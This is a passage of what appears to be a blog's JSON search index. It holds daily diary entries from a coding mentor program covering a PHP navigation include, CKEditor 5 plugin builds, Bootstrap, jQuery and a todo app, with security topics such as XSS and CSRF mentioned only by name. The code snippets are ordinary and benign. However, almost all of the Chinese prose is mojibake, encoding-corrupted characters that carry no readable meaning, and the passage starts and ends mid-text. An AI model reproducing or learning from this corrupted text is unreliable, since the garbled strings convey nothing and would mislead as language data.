ˆå­¸æœƒçš„äº‹æƒ…ï¼Œcode å†å¤šå†é•·ï¼Œä¹Ÿæ˜¯è¦æƒ³è¾¦æ³•æ‰¾å‡ºä½ çš„ç›®æ¨™ï¼Œä¸èƒ½å› ç‚º code é•·å°±çœ¼èŠ±æ’©äº‚ã€‚ ä»Šå¤©æˆ‘ä¹Ÿå­¸åˆ°æ¨¡çµ„åŒ–çš„é‡è¦æ€§ï¼Œä¾‹å¦‚ã€Œå°è¦½åˆ—ã€ã€‚ ä¸€é–‹å§‹ç‚ºäº†è™•ç† activeï¼ˆç›®å‰æ‰€åœ¨é é¢ï¼‰çš„æ•ˆæœï¼Œæˆ‘æ˜¯ç”¨ä¸€å€‹ä¸€å€‹æ”¹çš„æ–¹å¼ä¾†æŠŠè©²æœ‰ active çš„ class åŠ ä¸Šå»ã€‚ä½†å¾Œä¾†ç™¼ç¾é€™æ¨£ä¸è¡Œï¼Œå¦‚æœä¹‹å¾Œè¦æ”¹ä¸€å€‹æ±è¥¿ï¼Œæˆ‘ä¸å°±è¦æ”¹ä¸€å¤§å †é é¢ï¼Ÿå®Œå…¨ä¸èƒ½æ¥å—ã€‚æ‰€ä»¥æ€è€ƒæœ‰æ²’æœ‰è¾¦æ³•æŠŠå°è¦½åˆ—æŠ½å‡ºä¾†è®Šæˆä¸€å€‹æ¨¡çµ„ï¼Œæ–¼æ˜¯å°± nav.php å°±èª•ç”Ÿäº†ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455&lt;?php $username = null; if (!empty($_SESSION['username'])) { $username = $_SESSION['username']; }?&gt;&lt;nav class=\"navbar navbar-expand-lg navbar-dark bg-dark\"&gt; &lt;div class=\"container\"&gt; &lt;a class=\"navbar-brand fw-bold\" href=\"index.php\"&gt;PeaNu&lt;/a&gt; &lt;button class=\"navbar-toggler\" type=\"button\" data-bs-toggle=\"collapse\" data-bs-target=\"#navbarSupportedContent\" aria-controls=\"navbarSupportedContent\" aria-expanded=\"false\" aria-label=\"Toggle navigation\"&gt; &lt;span class=\"navbar-toggler-icon\"&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=\"collapse navbar-collapse\" id=\"navbarSupportedContent\"&gt; &lt;ul class=\"navbar-nav me-auto mb-2 mb-lg-0 w-100\"&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link &lt;?php if (str_contains($_SERVER['REQUEST_URI'], '/categories.php')) { echo 'active'; } ?&gt;\" href=\"categories.php\"&gt;æ–‡ç« åˆ†é¡&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item me-lg-auto\"&gt; &lt;a class=\"nav-link &lt;?php if (str_contains($_SERVER['REQUEST_URI'], '/about.php')) { echo 'active'; } ?&gt;\" href=\"about.php\"&gt;é—œæ–¼æˆ‘&lt;/a&gt; &lt;/li&gt; &lt;?php if (empty($username)) { ?&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"login.php\"&gt;ç™»å…¥&lt;/a&gt; &lt;/li&gt; &lt;?php } else { ?&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link &lt;?php if (str_contains($_SERVER['REQUEST_URI'], '/admin.php')) { echo 'active'; } ?&gt;\" href=\"admin.php\"&gt;å¾Œå°ç®¡ç†&lt;/a&gt; &lt;/li&gt; &lt;li class=\"nav-item\"&gt; &lt;a class=\"nav-link\" href=\"handle.logout.php\"&gt;ç™»å‡º&lt;/a&gt; &lt;/li&gt; &lt;?php } ?&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/div&gt;&lt;/nav&gt; åƒé€™æ¨£æŠ½å‡ºä¾†ä¹‹å¾Œï¼Œæ¯å€‹æª”æ¡ˆåªè¦ä¸€å¥ï¼š 1require_once('nav.php'); å°è¦½åˆ—å°±æœƒè‡ªå‹•è™•ç†å¥½ç™»å…¥ or ç™»å‡ºçš„ç‹€æ…‹ï¼Œè¦æ”¹æ±è¥¿ä¹Ÿåªè¦æ”¹é€™å€‹æª”æ¡ˆå°±å¥½ã€‚ æ‰€ä»¥æ¨¡çµ„åŒ–ç¢ºå¯¦æ˜¯ä¸€å€‹å¾ˆé‡è¦çš„æ¦‚å¿µï¼Œå¸Œæœ›ä¹‹å¾Œä¹Ÿèƒ½å–„ç”¨æ¨¡çµ„ä¾†è§£æ±ºå„ç¨®æƒ±äººçš„äº‹ã€‚ é¡Œå¤–è©±æœ€è¿‘é–‹å§‹ç©äº† Pokemon uniteã€‚ç”¨æŠ•ç±ƒçš„æ–¹å¼ä¾†åŒ…è£ Dota é€™ä¸€é»è »æœ‰å‰µæ„çš„ã€‚ä»¥å‰æ²’æœ‰å¾ˆå–œæ­¡ç©é€™é¡çš„éŠæˆ²ï¼Œé€™ä¹Ÿæ˜¯ç¬¬ä¸€æ¬¾è®“æˆ‘è¦ºå¾—é‚„ä¸éŒ¯ç©çš„éŠæˆ²ã€‚ è¨±é¡˜æ± ä½œæ¥­äºŒä¹Ÿå¿«å‘Šä¸€æ®µè½äº†ï¼Œæ˜å¤©åªè¦æŠŠå‰©ä¸‹çš„åˆ†é¡é é¢çµ¦åšå®Œï¼Œå†åšä¸€é»å„ªåŒ–ä¹Ÿè¨±å°±å®Œæˆäº†ã€‚","link":"/2022/02/19/mentor-program-day67/"},{"title":"mentor-program-day68","text":"è¾›è‹¦ä½†å€¼å¾—çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©èŠ±äº†ä¸å°‘æ™‚é–“æŠŠéƒ¨è½æ ¼åŠ äº†å¾ˆæ£’çš„åŠŸèƒ½ï¼š åˆ†é¡å°è¦½ / åˆ†é¡éæ¿¾ å¼•å…¥æ–‡å­—ç·¨è¼¯å™¨ / æ–‡ç« é–±è®€ç•«é¢å„ªåŒ– é›–ç„¶é€”ä¸­è¸©äº†ä¸å°‘é›·ï¼Œä½†çœ‹åˆ°æœ€å¾Œçš„æˆæœå°±å¿ƒæ»¿æ„è¶³äº†ï½ å­¸åˆ°çš„äº‹æƒ…åœ¨åšåˆ†é¡é é¢è·Ÿç¯©é¸çš„æ™‚å€™ï¼Œè¦ã€Œé—œè¯ã€çš„è³‡æ–™è®Šå¾—è¶Šä¾†è¶Šè¤‡é›œï¼Œä¹Ÿå› ç‚ºé€™é»ç·´ç¿’äº†è »å¤š SQL çš„æ“ä½œé‚è¼¯ï¼Œæ„Ÿè¦ºç¾åœ¨å° SQL åˆæ›´ç†Ÿæ‚‰äº†ä¸€é»å§ï¼ å†ä¾†æ˜¯ä¸²æ¥ CKEditor çš„éƒ¨åˆ†ã€‚ä¸€é–‹å§‹åœ¨æŸ¥è³‡æ–™çš„æ™‚å€™å¡è »ä¹…çš„ï¼Œå› ç‚º CKEditor æœ‰åˆ†æˆ 4ã€5 çš„ç‰ˆæœ¬ï¼ŒåŸæœ¬æ²’æƒ³å¤ªå¤šï¼Œæƒ³èªªå°±éƒ½æ‰¾ä¾†çœ‹çœ‹ï¼Œçµæœå¾Œä¾†çœ‹åˆ° 4ã€5 æ˜¯å®Œå…¨ä¸ç›¸å®¹çš„å…©å€‹ç‰ˆæœ¬ï¼Œæ‰é–‹å§‹ä¹–ä¹–æ‰¾ 5 çš„ä¾†çœ‹ã€‚ç¸½ä¹‹ï¼Œæœ‰é»å…œäº†å€‹åœˆçš„æ„Ÿè¦º (ï½¡Ã­ _ Ã¬ï½¡) å†ä¾†æ˜¯ç ”ç©¶ CKEditor åŠŸèƒ½ï¼Œä¸€é–‹å§‹æ‡¶æƒ°çš„æˆ‘æƒ³èªªèƒ½ç”¨ CDN è§£æ±ºå°±ç”¨ CDN è§£æ±ºå§ï¼æœä¸å…¶ç„¶ï¼Œè¢«è‡ªå·±é›·çš„ä¸è¦ä¸è¦çš„ã€‚å¾Œä¾†èŠ±äº†å¾ˆå¤šæ™‚é–“çˆ¬è³‡æ–™ï¼Œæ‰çŸ¥é“è¦æ·»åŠ  Plug-in çš„è©±å¾—ç›´æ¥æŠŠ CKEditor çš„æºç¢¼è¼‰ä¸‹ä¾†èª¿æ•´å¾Œå†é‡æ–°ç·¨è­¯æˆ bundleã€‚ é€™æ®µéç¨‹é‚„è »æœ‰æ„æ€çš„ï¼Œæˆ‘å­¸åˆ°å¾ˆå¤šã€ŒæŠŠåˆ¥äººå¯«å¥½çš„å¥—ä»¶åŠ ä¸Šè‡ªå·±æƒ³è¦çš„åŠŸèƒ½ã€é€™ä»¶äº‹ï¼Œä¾‹å¦‚èªª Bootstrap é è¨­æ²’æœ‰æŸäº› utilitiesï¼Œæ‰€ä»¥æˆ‘å°±çˆ¬äº†å®˜æ–¹æ–‡ä»¶æˆåŠŸæå‡ºè‡ªå·±æƒ³è¦çš„ utilitiesï¼›é‚„æœ‰åœ¨å¼„ highlight.js çš„æ™‚å€™æƒ³è¦åŠ ä¸Š line-number çš„åŠŸèƒ½ï¼Œä¹Ÿæ˜¯ä¸Šç¶²æŸ¥äº†ä¸€ä¸‹ï¼Œç™¼ç¾æœ‰äººå¯«äº†ç›¸é—œå¥—ä»¶ï¼Œä½†æ¨£å¼çš„éƒ¨åˆ†å¾—è‡ªå·±å¯« CSSï¼Œæ‰€ä»¥å°±ç”¨å„ç¨®ç¥å¥‡çš„æ–¹å¼ä¾†æå‡ºå°ˆå±¬è‡ªå·±çš„ code blockã€‚ç¸½ä¹‹é€™æ˜¯ä¸€æ®µè »è¾›è‹¦ä½†ä¹Ÿå¾ˆæœ‰æ„æ€çš„æ™‚å…‰ (ï½¡â—•âˆ€â—•ï½¡) ç›®å‰ç¸½ç®—æ˜¯æŠŠéƒ¨è½æ ¼å‘Šä¸€å€‹æ®µè½äº†ï¼Œæ¥ä¸‹ä¾†åˆåˆ°äº†ç­†è¨˜æ™‚å…‰ï¼Œæƒ³æŠŠä»Šå¤©å­¸åˆ°çš„éƒ½å¥½å¥½ç´€éŒ„ä¸‹ä¾†ã€‚ é¡Œå¤–è©±ä»Šå¤©æŸ¥è³‡æ–™çœ‹åˆ°ã€ŒUPDã€ã€‚æƒ³èªªæ˜¯ä»€éº¼æ„æ€ï¼ŒæŸ¥äº†æ‰ç™¼ç¾åŸä¾†æ˜¯ updateâ€¦ï¼Œæœç„¶æ‡¶äººä¸åˆ†åœ‹ç•Œã€‚ è¨±é¡˜æ± æ˜å¤©è¦æŠŠéƒ¨è½æ ¼åšæœ€å¾Œå„ªåŒ–è·Ÿæª¢æŸ¥ï¼Œæ¥è‘—å°±èƒ½åšç­†è¨˜äº†ã€‚","link":"/2022/02/20/mentor-program-day68/"},{"title":"mentor-program-day69","text":"è¤‡ç¿’è·Ÿåšç­†è¨˜çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©æŠŠéƒ¨è½æ ¼åšæœ€å¾Œçš„èª¿æ•´ï¼Œé‚„æœ‰åšç­†è¨˜ï¼š CSS :only-child highlight.js çš„ä½¿ç”¨æ–¹æ³• CKEditor çš„ä½¿ç”¨æ–¹æ³• å¤§æ¦‚å°±é€™æ¨£ï½ å­¸åˆ°çš„äº‹æƒ…ç•¶æˆ‘é‡æ–°å›é ­çœ‹ä¸€éå®˜æ–¹æ–‡ä»¶æ™‚ï¼Œæœƒç™¼ç¾è‡ªå·±ç•¶åˆå¿½ç•¥æ‰äº†ä¸€äº›å…§å®¹ï¼Œæ‰€ä»¥æ‰æœƒåœ¨æŸäº›åœ°æ–¹å¡é—œã€‚ä¸éé€™ä¹Ÿè »æ­£å¸¸çš„ï¼Œç•¢ç«Ÿä½ é€šå¸¸ä¸æœƒæƒ³æŠŠæ‰€æœ‰æ™‚é–“éƒ½èŠ±åœ¨é–±è®€æ–‡ä»¶ã€‚æ‰€ä»¥èªªå­¸æœƒæ‰¾å‡ºé‡é»ã€æ•´ç†ä¸€ä»½çµ¦è‡ªå·±çœ‹çš„ç­†è¨˜ï¼Œæ˜¯æˆ‘å¾ç¬¬ä¸€å¤©åˆ°ç¾åœ¨å¯«äº†é€™éº¼å¤šç­†è¨˜å¾Œå­¸åˆ°çš„äº‹æƒ…ã€‚åªè¦æŒæ¡é€™å€‹æŠ€èƒ½ï¼Œæˆ‘ç›¸ä¿¡è¦ä¹‹å¾Œå­¸ä¸€æ¨£æ–°æ±è¥¿æˆ–æŠ€è¡“çš„æ™‚ï¼Œä½ å°±èƒ½å­¸å¾—æ¯”åˆ¥äººå¿«ï¼Œæ¯”åˆ¥äººå¥½ã€‚ å¦å¤–å¤šå»å˜—è©¦ä¹Ÿæ˜¯è »é‡è¦çš„äº‹æƒ…å§ï¼Œå¦‚æœæœ‰å€‹æ±è¥¿æ€éº¼æŸ¥éƒ½æŸ¥ä¸åˆ°è³‡è¨Šï¼Œæˆ–æ ¹æœ¬ä¸çŸ¥é“è©²æ€éº¼ä¸‹é—œéµå­—ï¼Œé‚£æœ€ç°¡å–®çš„æ–¹å¼å°±æ˜¯å»å˜—è©¦å„ç¨®ä½ è¦ºå¾—å¯èƒ½æ˜¯ä»€éº¼çš„å¯¦é©—ã€‚ä¾‹å¦‚æˆ‘ä»¥å‰ä¸€ç›´éƒ½æä¸æ‡‚ highlight.js çš„å¯¦éš›ä¸»é¡Œåç¨± æ˜¯ä»€éº¼ï¼ˆåƒ A 11 Y Darkï¼Œæª”æ¡ˆåç¨±ä¸å¯èƒ½æ˜¯é€™æ¨£ï¼‰ï¼Œç›´åˆ°æŠŠæºç¢¼è¼‰ä¸‹ä¾†ï¼Œç™¼ç¾è£¡é¢æœ‰æ¯å€‹å°æ‡‰çš„ CSS æª”æ¡ˆæ‰æç„¶å¤§æ‚Ÿã€‚ é¡Œå¤–è©±å†·çˆ†äº†ï¼Œå‡ç•ªè–¯ï¼ˆå–è‡ªæŸåª’é«”å½¢å®¹ç¾åœ¨çš„å°ç£ï¼‰ã€‚ è¨±é¡˜æ± æ˜å¤©æŠŠç­†è¨˜åšå®Œå¾Œ week11 æ‡‰è©²å°±çµæŸäº†ï¼ŒåŠ æ²¹ã€‚","link":"/2022/02/21/mentor-program-day69/"},{"title":"mentor-program-day70","text":"é€²å…¥ 7 å­—é ­ã€‚ é€²åº¦ä»Šå¤©æŠŠæ˜¨å¤©æ²’åšå®Œçš„ç­†è¨˜åšå®Œï¼Œä¹Ÿå¯«äº†ä½œæ¥­çš„å•ç­”é¡Œï¼Œä½†é‚„æ²’å¯«å®Œï¼Œæ˜å¤©è¦è¶•å¿«è£œé½Šã€‚ å­¸åˆ°çš„äº‹æƒ…åœ¨å¯« CKEditor çš„ä½¿ç”¨æ–¹æ³• çš„æ™‚å€™å¡åœ¨ä¸€å€‹åœ°æ–¹å¡äº†å¾ˆä¹…ï¼Œæœ€å¾Œç™¼ç¾åŸä¾†æ˜¯ä¸‹è¼‰åˆ°å¤ªèˆŠçš„ç‰ˆæœ¬ï¼ŒçœŸæ˜¯å›§åˆ°æ¥µè‡´ orzã€‚ å¾Œä¾†ä¹Ÿå› ç‚ºå¥½å¥‡å®˜æ–¹æ–‡ä»¶å¯«çš„å…©ç¨®æ–¹æ³•åˆ°åº•å·®åœ¨å“ªï¼Œç ”ç©¶äº†ä¸€æ®µæ™‚é–“ã€‚ ç›´æ¥ç”¨ JS å¼•å…¥ï¼š 123456789101112131415161718192021222324252627282930import ClassicEditor from '@ckeditor/ckeditor5-build-classic';import Indent from '@ckeditor/ckeditor5-indent/src/indent'; // &lt;--- ADDEDClassicEditor .create(document.querySelector( '#editor' ), { plugins: [Indent], // &lt;--- ADDED toolbar: { items: [ 'heading', '|', 'bold', 'italic', 'link', 'bulletedList', 'numberedList', '|', 'outdent', 'indent', // &lt;--- ADDED '|', 'uploadImage', 'blockQuote', 'insertTable', 'mediaEmbed', 'undo', 'redo', ] }, }) .catch( error =&gt; { console.error( error );}); å…ˆæ”¹æºç¢¼åœ¨é‡æ–° build ä¸€ä»½ï¼š 12345678910111213141516171819202122232425262728293031323334import ClassicEditorBase from '@ckeditor/ckeditor5-editor-classic/src/classiceditor';import Essentials from '@ckeditor/ckeditor5-essentials/src/essentials';import UploadAdapter from '@ckeditor/ckeditor5-adapter-ckfinder/src/uploadadapter';import Autoformat from '@ckeditor/ckeditor5-autoformat/src/autoformat';import Bold from '@ckeditor/ckeditor5-basic-styles/src/bold';import Italic from '@ckeditor/ckeditor5-basic-styles/src/italic';import BlockQuote from '@ckeditor/ckeditor5-block-quote/src/blockquote';import Alignment from '@ckeditor/ckeditor5-alignment/src/alignment'; // &lt;--- ADDEDexport default class ClassicEditor extends ClassicEditorBase {}ClassicEditor.builtinPlugins = [ Essentials, UploadAdapter, Autoformat, Bold, Italic, BlockQuote, Alignment // &lt;--- ADDED // ...];ClassicEditor.defaultConfig = { toolbar: { items: [ 'heading', 'bold', 'alignment' // &lt;--- ADDED // ... ] }, // ...}; æˆ‘ç”¨çš„æ–¹æ³•æ˜¯ç¬¬äºŒç¨®ï¼Œé‚„è »å¥½ç†è§£çš„ï¼Œå°±æ˜¯å…ˆæ”¹å¥½è¨­å®šå¾Œå†é‡æ–° build ä¸€ä»½ä¾†ç”¨çš„æ¦‚å¿µã€‚ä½†ç¬¬ä¸€ç¨®æˆ‘åœ¨è©¦çš„æ™‚å€™æ€éº¼ç”¨éƒ½ä¸è¡Œï¼Œç›´åˆ°å¾Œä¾†çœ‹äº† webpack æ–°æ‰‹æ•™å­¸ä¹‹æ·ºè«‡æ¨¡çµ„åŒ–èˆ‡ snowpack æ‰çŸ¥é“åŸä¾†è¦å…ˆç”¨ webpack ä¾†æ‰“åŒ…å¾Œå†æ‹¿ä¾†ç”¨ï¼Œå¾Œä¾†ç…§åšå¾Œå°±æˆåŠŸå¼•å…¥äº†ã€‚ ä¸éé‚„æ˜¯æœ‰å€‹æ²’è§£é–‹çš„å•é¡Œï¼Œå°±æ˜¯è¦æ·»åŠ æ–°çš„ plug-in æ™‚ä¸€ç›´å™´ duplicated modulesï¼ˆæ¨¡çµ„é‡è¤‡è¼‰å…¥ï¼‰çš„éŒ¯èª¤ã€‚ å¾Œä¾†çˆ¬äº†é€™ç¯‡ æå• æ‰çŸ¥é“å•é¡Œæ‡‰è©²å‡ºåœ¨é€™ä¸€å¥ï¼š 1import ClassicEditor from '@ckeditor/ckeditor5-build-classic'; æŒ‰ç…§å®˜æ–¹æ–‡ä»¶çš„æ„æ€æ˜¯ä¸å¯ä»¥åœ¨å·²ç¶“ build å¾Œçš„æª”æ¡ˆè£¡åŠ æ–°çš„ plug-inï¼Œå› ç‚º plug-in å¯èƒ½éœ€è¦ä¾è³´ src è£¡é¢çš„å…¶ä»–å¥—ä»¶ï¼ˆç›¸ä¾å§“ dependenciesï¼‰ã€‚å¦å¤– plug-in ä¹Ÿæœ‰ä¸€äº› code æ˜¯ bundle è£¡é¢å·²ç¶“æœ‰çš„ï¼Œé€™å°±æœƒå°è‡´duplicated modulesï¼ˆæ¨¡çµ„é‡è¤‡è¼‰å…¥ï¼‰çš„å•é¡Œã€‚ï¼ˆä¸éæˆ‘é‚„æ˜¯æ²’è©¦æˆåŠŸï¼Œæ€•èŠ±å¤ªå¤šæ™‚é–“ï¼Œæ‰€ä»¥ä¹‹å¾Œæœ‰æ©Ÿæœƒåœ¨è©¦å§ï¼‰ é¡Œå¤–è©±æœ‰æ™‚å€™æ˜æ˜å°±å¤§æ¦‚æ‡‚äº†å»é‚„æ˜¯æä¸å®šï¼ŒçœŸæ˜¯ä»¶ä»¤äººå‚·å¿ƒçš„äº‹ã€‚ è¨±é¡˜æ± æ˜å¤©è¦æŠŠ week11 çµæŸï¼ŒåŠ æ²¹ï¼","link":"/2022/02/22/mentor-program-day70/"},{"title":"mentor-program-day71","text":"ç¹¼çºŒé€²å…¥ä¸‹ä¸€é€±ã€‚ é€²åº¦ä»Šå¤©æŠŠ week11 æœ€å¾Œçš„ç°¡ç­”é¡Œåšå®Œäº†ã€‚èŠ±äº†ä¸€æ•´å¤©çš„æ™‚é–“ç ”ç©¶ CSRFï¼Œæ„Ÿè¦ºæœ‰æ¯”è¼ƒæ¸…æ¥šä¸€é»äº†ï¼Œé›–ç„¶æ²’å¯¦ä½œå‡ºä¾†æœ‰é»å¯æƒœã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©åˆå†æ¬¡è¤‡ç¿’è³‡è¨Šå®‰å…¨çš„çŸ¥è­˜ï¼š XSS SQL Injection CSRF æ¬Šé™ç®¡ç† åœ¨çœ‹å®Œè‡ªæˆ‘æª¢è¨å¾Œæ·±æ·±é«”æœƒåˆ°è³‡å®‰çš„ç´°ç¯€æœ‰å¤šæ·±ã€‚æƒ³åšå¥½è³‡å®‰ï¼Œå°±å¾—å…ˆæŠŠè®“è‡ªå·±è®Šæˆè¢«å®³å¦„æƒ³ç—‡ï¼Œå°æ–¼ä»»ä½•ç´°ç¯€éƒ½è¦ç§‰æŒæ‡·ç–‘çš„å¿ƒæ…‹ä¾†å¯©è¦–ã€‚ ä½†ä¹Ÿå¥½åœ¨ Huli å°è³‡å®‰è »æœ‰èˆˆè¶£çš„ï¼Œæ‰æœ‰æ©Ÿæœƒå­¸åˆ°é€™éº¼å¤šè·Ÿè³‡å®‰æœ‰é—œçš„çŸ¥è­˜ã€‚å¸Œæœ›è‡ªå·±æœªä¾†åœ¨åšå°ˆæ¡ˆçš„æ™‚å€™ä¹Ÿèƒ½ç¶­æŒé€™å€‹è‰¯å¥½çš„ç²¾ç¥ï¼Œå¯«å‡ºè®“äººå®‰å®‰å¿ƒå¿ƒçš„ codeã€‚ é¡Œå¤–è©±çª©å¥½å†·ï½ä½†å¥³æœ‹å‹è¦ºå¾—ç¾åœ¨æ˜¯å°ç£æœ€èˆ’æœçš„å¤©æ°£ã€‚ è¨±é¡˜æ± æ˜å¤©è¦é–‹å§‹ week12ï¼Œåˆæ˜¯æ–°çš„ä¸€é€±äº†ï¼ŒåŠ æ²¹åŠ æ²¹ï¼","link":"/2022/02/23/mentor-program-day71/"},{"title":"mentor-program-day72","text":"çœ‹äº†å¾Œé¢å¹¾é€±çš„èª²ç¨‹å¾Œï¼Œé»˜é»˜æ„Ÿåˆ°å£“åŠ›å±±å¤§ã€‚ é€²åº¦ä»Šå¤©é€²å…¥ week12ï¼Œç”¨ jQuey å’Œ Bootstrap åšäº†ç¬¬ä¸€å€‹ä½œæ¥­ï¼š ä¹Ÿåšäº†ä¸€äº›ç°¡çŸ­ç­†è¨˜ï¼š jQuery éš¨ç­†è¨˜ Loading-overlay æ‡¶äººåŒ… ç”¨ jQuery ç™¼ AJAX å­¸åˆ°çš„äº‹æƒ…å„˜ç®¡ä»¥å‰å°±ç”¨é jQueryï¼Œä½†é‚£æ˜¯åœ¨æˆ‘ JS åŸºç¤é‚„æ²’æœ‰å¾ˆå®Œæ•´çš„æƒ…æ³ä¸‹å­¸çš„ã€‚ç¾åœ¨å›æƒ³èµ·ä¾†ï¼Œç¢ºå¯¦æœ‰ç¨®çŸ¥é“ç”¨ jQuery å¯ä»¥é€™æ¨£åšï¼Œä½†æ”¹æˆ JS å»ä¸çŸ¥é“æ€éº¼åšçš„å•é¡Œï¼Œæ‰€ä»¥ç‚ºä»€éº¼å¤§å®¶ç¸½æœƒèªªã€Œå…ˆæŠŠåŸºç¤æ‰“å¥½å†ä¾†å­¸å·¥å…·ã€å°±æ˜¯é€™å€‹åŸå› å§ã€‚ è‡³æ–¼ Bootstrapï¼Œå¾ä¸Šä¸€é€±é–‹å§‹è·Ÿå®ƒäº†è§£å½¼æ­¤ä¹‹å¾Œï¼Œæœ‰æ¼¸æ¼¸æŠ“åˆ°å®ƒã€Œå¥½ç”¨ã€çš„åœ°æ–¹ï¼š è¡¨å–®å…ƒä»¶çœäº‹å¤šäº†ï¼ˆè‡ªå·±åšå¾ˆéº»ç…©ï¼Œå„ç¨® pseudo-class å’Œé è¨­æ¨£å¼è¦è™•ç†ï¼‰ card button navbar list group é€™äº› Componentsï¼Œåªè¦ç†Ÿæ‚‰å¾Œæ”¹èµ·ä¾†ä¹Ÿå¾ˆå¿« utilitiesï¼Œé–‹å§‹èƒ½æ¥å—é€™ç¨® CSS çš„å¯«æ³•ï¼Œä¸æƒ³å¯« class åç¨±çš„æ™‚å€™çœŸçš„ç°¡å–®æš´åŠ›ï¼Œèªªä¸å®šä¹‹å¾Œå†ç†Ÿä¸€é»å°±èƒ½å»å¯« Tailwind äº† ä»¥å‰çš„æˆ‘å¾ˆæ’æ–¥ç”¨ Bootstrapï¼Œå› ç‚ºè¦ºå¾—è¦å¾åˆ¥äººçš„æ¶æ§‹ä¸‹å»æ”¹ CSS å¾ˆéº»ç…©ã€‚ä¸éé€™å€‹æƒ³æ³•æ…¢æ…¢åœ¨æ”¹è®Šï¼Œé›–ç„¶åŠ æ±è¥¿æœƒè®“ Code çœ‹èµ·ä¾†æ¯”è¼ƒè¤‡é›œä¸€äº›ï¼Œä½†é€™æ˜¯ç„¡æ³•é¿å…çš„äº‹ã€‚å¯« code ä¸èƒ½è¦æ±‚å‡¡äº‹å®Œç¾ï¼Œè€Œæ˜¯è¦é€æ¼¸æ¥å—äº‹æƒ…è®Šå¾—è¤‡é›œä¸€é»é€™ä»¶äº‹ã€‚ç•¶æˆ‘ç¿’æ…£è·Ÿæ¥å—é€™äº›ä¹‹å¾Œï¼Œå°±ä¸å†é‚£éº¼æ’æ–¥é€™ä»¶äº‹äº†ã€‚ é¡Œå¤–è©±å¤©æ°£å†·å†·åœ°å°±æœƒæƒ³åƒæ±è¥¿ï¼Œä½†ç˜¦ä¸ä¸‹å»çš„æˆ‘ä¸æ•¢äº‚åƒï¼Œå¹«è‡ªå·± QQã€‚ è¨±é¡˜æ± æ˜å¤©æœƒç¹¼çºŒåš week12 çš„ä½œæ¥­ï¼Œå¸Œæœ›ä¸€æ¨£èƒ½é †åˆ©å®Œæˆã€‚","link":"/2022/02/24/mentor-program-day72/"},{"title":"mentor-program-day73","text":"å°æ–¼æœªçŸ¥çš„æœªä¾†ï¼Œå…§å¿ƒå¶çˆ¾æœƒæ„Ÿåˆ°ææ‡¼ã€‚ é€²åº¦ä»Šå¤©åšäº†ç¬¬äºŒå€‹ä½œæ¥­ï¼Œå…ˆæŠŠç‰ˆåˆ‡å¥½è·Ÿåšäº†åŸºæœ¬åŠŸèƒ½ï¼š æ–°å¢ todo åˆªé™¤ todo ä¿®æ”¹ todoï¼ˆé€™å€‹æœ€é›£ï¼‰ æ¨™è¨˜ç‚ºå·²å®Œæˆ å­¸åˆ°çš„äº‹æƒ…ä¾†è«‡è«‡ todo listã€‚æˆ‘èªç‚ºå®ƒæ˜¯ä¸€å€‹çœ‹èµ·ä¾†å¾ˆåŸºæœ¬ï¼Œå»åŸ‹è—å¾ˆå¤šç´°ç¯€çš„å°ç¨‹å¼ã€‚ å¾ˆå¤š App å¹³å¸¸åœ¨ç”¨çš„æ™‚å€™éƒ½æ²’æ„Ÿè¦ºï¼Œä¾‹å¦‚èªªï¼š åƒé€™å€‹ã€Œé»ä¸‹å»å½ˆå‡ºä¾†å°è¦–çª—çš„åŠŸèƒ½ã€ï¼Œèº«ç‚ºä½¿ç”¨è€…æœƒè¦ºå¾—é€™å¾ˆç›´è¦ºé˜¿ï¼Œæœ¬ä¾†å°±è©²é€™æ¨£å­ã€‚ å¯æ˜¯å¯¦éš›å»é–‹ç™¼å°±æœƒå¸¸å¸¸ç¢°åˆ°ã€Œç–‘ï¼Ÿé€™å€‹ç†Ÿæ‚‰çš„åŠŸèƒ½è¦å¯¦ç¾å¥½åƒæœ‰é»è¤‡é›œï¼Ÿã€ï¼Œæˆ–è€…æ˜¯ã€Œæ€éº¼åšå‡ºä¾†æ²’è¾¦æ³•åƒçœŸçš„ App ä¸€æ¨£æµæš¢ã€ï¼Œæ™‚ä¸æ™‚å°±æœƒæ„Ÿå—åˆ°è¦è®“ã€Œä»‹é¢èˆ‡ç¨‹å¼å®Œç¾çš„æ¥åˆã€æ˜¯ä»¶ç‰¹åˆ¥é›£çš„äº‹æƒ…ã€‚ ç¾åœ¨ç”¨ App æ™‚éƒ½æœƒç‰¹åˆ¥æ³¨æ„ä»¥å‰æ²’æ³¨æ„åˆ°çš„ç´°ç¯€ï¼Œå½ˆå‡ºå‹•ç•«ã€éŸ³æ•ˆã€åˆ‡æ›ç•«é¢æˆ–åé¥‹æ•ˆæœï¼Œé€™äº›éƒ½æ˜¯åªæœ‰ç¶“æ­·éé–‹ç™¼æ‰èƒ½é«”æœƒåˆ°çš„ç´°ç¯€ã€‚è¦è®“ä¸€å€‹ App ç”¨èµ·ä¾†å¾ˆç›´è¦ºã€å¾ˆé †æš¢ï¼ŒçœŸçš„å¾—ä¸‹è »å¤šåŠŸå¤«çš„ï¼Œé€™æ˜¯æˆ‘åšäº†é€™å¹¾é€±ä½œæ¥­å¾Œçš„æ„Ÿè§¸ã€‚ é¡Œå¤–è©±è·‘é€™ä»½è¨ˆç•«ä¹Ÿæœ‰æ®µæ™‚é–“äº†ï¼Œæˆ‘è¦ºå¾—è‡ªå·±é€²æ­¥äº†å¾ˆå¤šï¼Œä½†é‚„æ˜¯æœƒå®³æ€•å°æ¥­ç•Œä¾†èªªæˆ‘ä¸éæ˜¯å€‹èœæ¸£ï¼Œæ²’æœ‰é”åˆ°æ¥­ç•Œçš„éœ€æ±‚ã€‚ ä¹Ÿè¨±æ˜¯æˆ‘éå»èŠ±äº†å¤ªå¤šæ™‚é–“ï¼Œä¹Ÿå“å˜—äº†ç„¡æ•¸æ¬¡å¤±æ•—çš„ç¶“é©—æ‰æœƒè®“æˆ‘é€™éº¼æ“”å¿ƒã€‚ä¸éï¼Œé‚„æ˜¯è¦ç¹¼çºŒå 